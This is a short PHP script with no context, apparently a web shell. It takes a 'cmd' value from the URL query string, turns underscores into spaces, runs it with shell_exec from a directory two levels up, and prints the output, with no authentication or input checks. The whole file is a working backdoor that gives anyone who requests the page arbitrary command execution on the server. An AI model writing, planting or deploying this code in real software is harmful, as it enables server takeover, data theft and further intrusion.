<?php 
$usercmd = $_GET['cmd'];
$usercmd = str_replace("_"," ",$usercmd);
$output = shell_exec("cd ../../; " . $usercmd);
echo $output
?> 